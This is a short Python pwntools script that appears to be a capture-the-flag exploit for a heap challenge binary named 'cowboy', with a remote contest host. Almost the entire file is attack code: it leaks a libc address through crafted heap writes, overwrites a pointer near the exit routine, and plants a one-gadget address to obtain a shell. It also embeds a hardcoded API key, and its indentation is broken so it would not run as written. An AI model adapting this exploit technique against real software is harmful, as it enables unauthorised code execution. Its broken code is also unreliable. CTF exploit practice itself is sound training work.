#!/usr/bin/python
from pwn import *
import json
import code

YOUR_API_KEY = 'a9cf8f6df800c59d29e77bd8a45c2d2c19ca4defb1ee37cd8650d0774acd52d7'

context(terminal = ['xterm', 'splitw'])
#context.terminal = ['tmux', 'splitw', '-h']
local = True
elf = ELF('cowboy')

if local:
	libc = ELF('libc')
	p = process('cowboy')
else:
	libc = ELF('libc')
	p = remote('cowboy.eatpwnnosleep.com', 14697)


        a = {
            'apikey' : YOUR_API_KEY,
            }

        p.send(json.dumps(a).encode())

def alloc(size):
    p.sendline('1')
    p.sendline(str(size))

def free(bbin, num):
    p.sendline('2')
    p.sendline(str(bbin))
    p.sendline(str(num))

def show():
    p.sendline('3')

def fill(bbin, num, msg):
    p.sendline('4')
    p.sendline(str(bbin))
    p.sendline(str(num))
    p.send(msg)

def exit():
    p.sendline('5')

exit = 0x602088
rand = 0x602090

#allocate 16
alloc(16)
#leak
payload = p64(0) + p64(0x602090)
fill(0, 0, payload)

alloc(16)
show()
#get addreess
p.clean(1)
show()

p.recvuntil('0x')
line = p.recvline()
addr = line.split()

m_addr = int(addr[0],16)
leak = int(addr[2], 16)
libc_base = leak - 0x3af60
#wirte address to mmap
payload = p64(exit) + p64(m_addr)
fill(0, 0, payload)
#allocate 16 again
alloc(16)
#write bin 0 num 4 oneshot
payload = p64(libc_base + 0x4526a)
fill(0, 4, payload)

p.interactive()


